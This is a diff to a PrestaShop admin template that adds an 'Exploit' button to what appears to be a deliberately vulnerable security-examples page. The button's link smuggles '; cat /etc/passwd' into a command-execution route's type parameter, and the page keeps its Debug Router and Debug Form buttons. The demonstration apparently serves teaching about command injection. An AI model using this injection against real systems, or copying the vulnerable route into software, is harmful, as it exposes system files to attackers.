@@ -1,7 +1,18 @@
 {% extends '@PrestaShop/Admin/layout.html.twig' %}
 
 {% block content %}
-  <div class="bd-example">
+  <div>
+    <a class="btn btn-danger" href={{ path('security_examples_rce_command', {type: '; cat /etc/passwd'}) }}>
+      <i class="material-icons">
+        whatshot
+      </i>
+      Exploit
+    </a>
+  </div>
+
+  <br />
+
+  <div>
     <a href="{{ path('security_examples_rce_command', {type: 'router'}) }}" class="btn btn-outline-primary">Debug Router</a>
     <a href="{{ path('security_examples_rce_command', {type: 'form'}) }}" class="btn btn-outline-primary">Debug Form</a>
   </div>
